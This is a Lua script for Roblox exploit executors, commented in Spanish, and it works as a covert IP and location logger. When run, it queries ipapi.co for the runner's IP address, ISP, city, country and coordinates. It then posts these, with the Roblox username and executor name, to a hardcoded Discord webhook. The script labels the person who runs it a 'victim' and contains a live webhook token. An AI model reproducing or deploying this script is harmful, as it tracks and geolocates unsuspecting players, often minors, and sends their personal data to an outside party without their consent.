local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Detecta plataforma
local platform = "Desconocido"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    platform = "Teléfono"
elseif UserInputService.KeyboardEnabled then
    platform = "PC"
end

-- Convierte código ISO a emoji de bandera
local function codeToEmoji(code)
    if not code or #code ~= 2 then return "🏳️" end
    local first = string.byte(code:sub(1,1):upper()) - 65 + 0x1F1E6
    local second = string.byte(code:sub(2,2):upper()) - 65 + 0x1F1E6
    return utf8.char(first, second)
end

-- Detecta ubicación e ISP
local function detectLocation()
    local country, countryCode, city, ip, lat, lon, isp = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil, "Desconocido"
    local services = {
        "https://ipapi.co/json"
    }
    for _, url in ipairs(services) do
        local success, response = pcall(function()
            return (syn and syn.request or http_request or request)({Url=url, Method="GET"}).Body
        end)
        if success and response then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
            if ok and data then
                local latTemp = tonumber(data.latitude or data.lat)
                local lonTemp = tonumber(data.longitude or data.lon)
                if latTemp and lonTemp then
                    latTemp = latTemp + (math.random(-20,20)/1000)
                    lonTemp = lonTemp + (math.random(-20,20)/1000)

                    country = data.country_name or country
                    countryCode = data.country_code or countryCode
                    city = data.city or city
                    ip = data.ip or ip
                    lat = latTemp
                    lon = lonTemp
                    isp = data.org or isp
                    break
                end
            end
        end
    end

    local emojiCountry = codeToEmoji(countryCode)
    local displayCountry = country.." "..emojiCountry

    local km = "N/A"
    local lat0, lon0 = 0, 0
    if lat and lon then
        local function deg2rad(deg) return deg * math.pi / 180 end
        local R = 6371
        local dLat = deg2rad(lat - lat0)
        local dLon = deg2rad(lon - lon0)
        local a = math.sin(dLat/2)^2 + math.cos(deg2rad(lat0))*math.cos(deg2rad(lat))*math.sin(dLon/2)^2
        local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
        km = math.floor(R * c)
    end

    local longDisplay = lat and lon and (lat..", "..lon) or "N/A"
    return displayCountry, city, km, longDisplay, ip, lat, lon, isp
end

local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal, ispName = detectLocation()

-- Mostrar ISP sin aclaración
local userISP = ispName ~= "Desconocido" and ("📡 "..ispName) or "🛰️ Desconocido"
local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332

if getgenv().WebhookEnviado then return end
getgenv().WebhookEnviado = true

local WebhookURL = "https://discord.com/api/webhooks/1408560291846815877/DvxArNfNtL2o9EbCH1Z7M9ByaVN8VTigxDL0-LSaK9HCGr_Xt6l5xCUaEz59k_4pPpNs"
local avatarUrl = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
local googleMapsLink = (latVal and lonVal) and "[Ver ubicación](https://www.google.com/maps?q="..latVal..","..lonVal..")" or "N/A"

local data = {
    ["username"] = "🕵🏻Reporting data victim",
    ["avatar_url"] = avatarUrl,
    ["content"] = "**💪 Ejecución detectada, datos de la victima recopilados ✅**",
    ["embeds"] = {{
        ["description"] = "Información capturada automáticamente con el mejor sistema hacking:",
        ["color"] = 16729344,
        ["thumbnail"] = {["url"] = avatarUrl},
        ["fields"] = {
            {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
            {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
            {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
            {["name"]="👥 Usuario", ["value"]=LocalPlayer.DisplayName, ["inline"]=true}, -- Muestra DisplayName donde estaba Username
            {["name"]="👤 DisplayName", ["value"]=LocalPlayer.Name, ["inline"]=true},     -- Muestra Username donde estaba DisplayName
            {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
            {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
            {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
            {["name"]="🗺️ Longitud/Latitud", ["value"]=longDisplay, ["inline"]=true},
            {["name"]="🔗 Ubicación", ["value"]=googleMapsLink, ["inline"]=false},
            {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
            {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
            {["name"]="💥 Estado", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
        },
        ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
    }}
}

local FinalData = HttpService:JSONEncode(data)
local req = syn and syn.request or http_request or request
if req then
    pcall(function()
        req({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = FinalData
        })
    end)
end
